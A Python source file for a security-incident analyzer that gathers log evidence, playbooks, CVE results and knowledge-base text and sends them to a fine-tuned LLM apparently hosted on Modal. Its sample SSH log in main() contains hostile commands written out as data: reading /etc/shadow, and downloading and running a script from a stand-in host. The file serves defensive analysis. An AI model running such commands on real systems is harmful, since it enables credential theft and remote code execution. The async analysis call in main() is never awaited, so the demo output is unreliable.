import modal
import logging

from app.schemas.analyze_incident_input_model import Evidence, Incident, IncidentAnalysisInput
from app.schemas.analyze_log_model import LogAnalysis
from app.schemas.analyzie_incident_output_model import IncidentAnalysis
from app.schemas.incident_playbook_model import IncidentPlaybook
from app.schemas.search_cve_model import CVESearchResult
from app.schemas.search_security_knowledge_model import SecurityKnowledgeSearchResult
from app.tools.analyze_log import AnalyzeLog
from app.tools.get_incident_playbook import IncidentPlaybookRetriever 
from app.tools.search_cve import SearchCVE
from app.tools.search_security_knowledge import SearchSecurityKnowledge

class IncidentAnalyzerTool():
    """This class is used to call our specialised fine tuned llm on modal that analyses security incidents"""

    def __init__(self):
        SecurityIncidentAnalyzer = modal.Cls.from_name("security-incident-analyzer", "SecurityIncidentAnalyzer")
        self.securityIncidentAnalyzer = SecurityIncidentAnalyzer()

    async def analyze_incident(self, incident: IncidentAnalysisInput) -> IncidentAnalysis:
        logging.info("Calling Incident Analyzer Fine Tuned LLM")
        payload = incident.model_dump(
            mode="json",
            exclude_none=True,
        )
        response = await self.securityIncidentAnalyzer.analyze.remote.aio(payload)
        valid_response = IncidentAnalysis.model_validate(
                    response
                )
        return valid_response
        
    def build_incident_analysis_input(
    self,
    incident_description: str,
    log_analysis: LogAnalysis,
    playbook: IncidentPlaybook | None = None,
    cve_result: CVESearchResult | None = None,
    security_knowledge_result: SecurityKnowledgeSearchResult | None = None,
    ) -> IncidentAnalysisInput:
        """
        Build the structured input expected by the fine-tuned
        security incident analyzer deployed on Modal.
        """

        evidence: list[Evidence] = []

        # 1. Convert log evidence to uniquely identified evidence items.
        for index, item in enumerate(log_analysis.evidence, start=1):
            evidence.append(
                Evidence(
                    id=f"ev_{index:03d}",
                    type="log_analysis",
                    source="analyze_log",
                    content={
                        "key": item.key,
                        "value": item.value,
                        "objective": log_analysis.objective,
                    },
                )
            )

        # 2. Preserve log observations as evidence.
        # These are derived from the analyzed logs.
        for observation in log_analysis.observations:
            evidence.append(
                Evidence(
                    id=f"ev_{len(evidence) + 1:03d}",
                    type="log_observation",
                    source="analyze_log",
                    content={
                        "observation": observation,
                        "objective": log_analysis.objective,
                    },
                )
            )

        # 3. Convert retrieved security knowledge to strings.
        security_knowledge = []

        if security_knowledge_result:
            for result in security_knowledge_result.results:
                security_knowledge.append(
                    (
                        f"Source: {result.source}\n"
                        f"Category: {result.category}\n"
                        f"Incident Type: {result.incident_type or 'general'}\n"
                        f"Content: {result.content}"
                    )
                )

        # 4. Preserve the playbook structure.
        playbook_data = (
            playbook.model_dump(mode="json")
            if playbook is not None
            else None
        )

        # 5. Preserve CVE search results.
        cve_results = []

        if cve_result is not None:
            cve_results = [
                {
                    "product": cve_result.product,
                    "version": cve_result.version,
                    **vulnerability.model_dump(mode="json"),
                }
                for vulnerability in cve_result.vulnerabilities
            ]

        # 6. Assemble the final payload.
        return IncidentAnalysisInput(
            incident=Incident(
                description=incident_description,
                incident_type=playbook.incident_type,
            ),
            evidence=evidence,
            security_knowledge=security_knowledge,
            playbook=playbook_data,
            cve_results=cve_results,
        )


def main():
    analyze_log = AnalyzeLog()
    raw_logs = f"""
        2026-10-14T09:12:01Z prod-web-01 sshd[1421]: Failed password for invalid user admin from 203.0.113.42 port 49120 ssh2
        2026-10-14T09:12:04Z prod-web-01 sshd[1423]: Failed password for invalid user root from 203.0.113.42 port 49122 ssh2
        2026-10-14T09:12:07Z prod-web-01 sshd[1425]: Failed password for deploy from 203.0.113.42 port 49124 ssh2
        2026-10-14T09:12:10Z prod-web-01 sshd[1427]: Failed password for deploy from 203.0.113.42 port 49126 ssh2
        2026-10-14T09:12:13Z prod-web-01 sshd[1429]: Failed password for deploy from 203.0.113.42 port 49128 ssh2
        2026-10-14T09:12:16Z prod-web-01 sshd[1431]: Accepted password for deploy from 203.0.113.42 port 49130 ssh2
        2026-10-14T09:12:17Z prod-web-01 systemd-logind[801]: New session 94 of user deploy.
        2026-10-14T09:12:29Z prod-web-01 sudo[1450]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/id
        2026-10-14T09:12:36Z prod-web-01 sudo[1455]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
        2026-10-14T09:12:44Z prod-web-01 sudo[1461]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/curl -o /tmp/diag.sh https://updates.example.org/diag.sh
        2026-10-14T09:12:50Z prod-web-01 sudo[1468]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/bash /tmp/diag.sh
        2026-10-14T09:13:05Z prod-web-01 sshd[1431]: Disconnected from user deploy 203.0.113.42 port 49130
    """
    objective = "Investigate suspicious SSH authentication activity on the production server. Identify potential brute-force attempts, successful unauthorized access, affected accounts, source IP addresses, suspicious post-login commands, and evidence of possible credential compromise or malicious execution. Distinguish confirmed log observations from unverified assumptions."
    analysed_log = analyze_log.analyze(raw_logs, objective)
    incident_playbok = IncidentPlaybookRetriever()
    retrived_playbook = incident_playbok.get_incident_playbook("credential_compromise")
    search_cve = SearchCVE()
    cve_result = search_cve.search_cve("OpenSSH", "9.2p1")
    search_security_knowledge = SearchSecurityKnowledge()
    retrieved_data = search_security_knowledge.search("SSH brute-force attacks, credential compromise, successful login after repeated failed authentication attempts, suspicious privileged command execution, Linux incident investigation, and indicators of unauthorized access")
    incident_analyzer_specialist = IncidentAnalyzerTool()
    incident_input = incident_analyzer_specialist.build_incident_analysis_input(
        incident_description=f"SSH brute-force attacks, credential compromise, successful login after repeated failed authentication attempts, suspicious privileged command execution, Linux incident investigation, and indicators of unauthorized access",
        log_analysis=analysed_log,
        playbook=retrived_playbook,
        cve_result=cve_result,
        security_knowledge_result=retrieved_data
    )
    result = incident_analyzer_specialist.analyze_incident(incident_input)
    print(result)

if __name__ == "__main__":
    main()